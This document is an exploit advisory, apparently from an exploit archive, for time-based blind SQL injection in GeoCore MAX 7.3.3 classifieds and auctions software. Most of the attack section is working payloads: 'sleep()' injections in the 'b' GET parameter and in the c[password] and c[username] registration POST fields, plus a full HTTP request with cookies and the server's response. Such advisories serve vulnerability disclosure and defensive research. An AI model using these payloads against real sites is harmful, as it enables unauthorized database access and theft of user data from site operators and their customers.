@@ -1,0 +1,112 @@
+###########################################################################################
+#Exploit Title: GeoCore MAX DB Ver. 7.3.3 - Time-Based Blind Injection
+#Official site: http://geodesicsolutions.com
+#Risk Level: High
+#Vendor : http://geodesicsolutions.com
+#Exploit Author: Esac
+#Homepage author : www.iss4m.ma
+#Last Checked: 25/04/2014
+###########################################################################################
+
+
++----------+
+| OVERVIEW |
++----------+
+
+GeoCore is the new name for all Geodesic Solutions software packages beginning with version 7.0.0.
+
+The products previously known as:
+
+GeoClassAuctions Enterprise
+GeoClassifieds Enterprise
+GeoClassifieds Premier
+GeoClassifieds Basic
+GeoAuctions Enterprise
+GeoAuctions Premier
+are now unified into a single product.
+
+Sites running GeoCore may use both Classifieds and Auctions, or may turn off one or the other as needed. Additional item types may be added in the future.
+
+GeoCore allows much greater flexibility for you, the customer: many features previously available only in the Enterprise-level software packages have been opened up to everyone, either as built-in features or Add Ons that may be purchased separately. With GeoCore, you now have the power to build exactly the type of site you want: add the features you need, leave the ones you don't, and add more Add Ons to your site at any time!
+
+GeoCore is the next step forward for Geodesic Solutions, and a powerful revolution in the field of Classifieds and Auctions software. Contact us today to find out how GeoCore can help you!
+
+
+Geocore is a premium version {
+
+GeoCore - Classifieds : $399.00 USD
+GeoCore - Auctions : $399.00 USD
+GeoCore - MAX : $499.00 USD
+
+}
+
++-----------------------------------------------------------------------------------+
+
+
+
++--------------------------------+
+| Time-Based Blind Injection     |
++--------------------------------+
+
+1) param : b  | method : GET
+
+http://server/index.php?a=5&b=15 {Inject here}
+
+ 
+Real exploitation :
+ 
+https://server/index.php?a=5&b=15 and sleep(2) &filterValue=1997&page=2&setFilter=cs_94
+ 
+==> will pause for 2 seconds and diplay the page after
+ 
+https://server/index.php?a=5&b=15 and sleep(10) &filterValue=1997&page=2&setFilter=cs_94
+==> will pause for 10 seconds and diplay the page after depending on load of files(imgs , css , js scripts)
+
+
+
+2) Vuln URL : /register.php?b=1 | URL encoded POST input c[password] set to secret"=sleep(3)="
+   Vuln Url: /register.php?b=1  | URL encoded POST input c[username] set to Esac"=sleep(3)="
+
+Example Real exploitation :
+
++---------------+
+HTTP headers :  |
++---------------+
+
+POST /register.php?b=1 HTTP/1.1
+Content-Length: 633
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Cookie: classified_session=2e766bb87b762c7461a4367f11f67b28; developer_force_type=MAX; master_auctions=off; master_classifieds=off; master_site_fees=on; classifieds=on; auctions=on; css_primary_tset=green_lite_primary; css_secondary_tset=black_secondary; admin_classified_session=d4f1b96a342a64fe272217ba14977f27; killmenothing
+Host: server.com
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Accept: */*
+
+c[address]=007 undertake&c[address_2]=007 undertake&c[agreement]=yes&c[business_type]=1&c[city]=Underground&c[company_name]=Infinity Security&c[email]=h@ck3r.cc&c[email_verifier]=h@ck3r.c&c[fax]=317-317-3137&c[firstname]=Esac&c[lastname]=Sec&c[password]=secret"=sleep(2)="&c[password_confirm]=acUn3t1x&c[phone]=010-239-1233&c[phone_2]=010-239-1233&c[sessionId]=5b6cb974e9eec4e7549c143885d82376&c[url]=1&c[username]=Esac&c[zip]=12345&force_validation=Submit Validation Results&locations[1]=1
+
++---------+
+Response  |
++---------+
+
+HTTP/1.1 200 OK
+Date: Tue, 22 Apr 2014 19:36:20 GMT
+Server: Apache/2.2.15 (Red Hat)
+X-Powered-By: PHP/5.4.27
+Cache-Control: no-cache, must-revalidate
+Expires: Sat, 26 Jul 1997 05:00:00 GMT
+Set-Cookie: classifieds=on; path=/
+Set-Cookie: auctions=on; path=/
+Set-Cookie: classified_session=dea12eb168dc174537517f1688070116; path=/; domain=.domain.com
+Keep-Alive: timeout=15, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+Content-Length: 16043
+
+
++--------------------------------------------------------------------------------------+
+
+If you want peace of mind , do not find fault with others , rather learn to see your own faults. Learn to make the whole world your own , no one is a stranger, this whole world is your own :)
+
+============================================ WwW.Iss4m.Ma ============================================
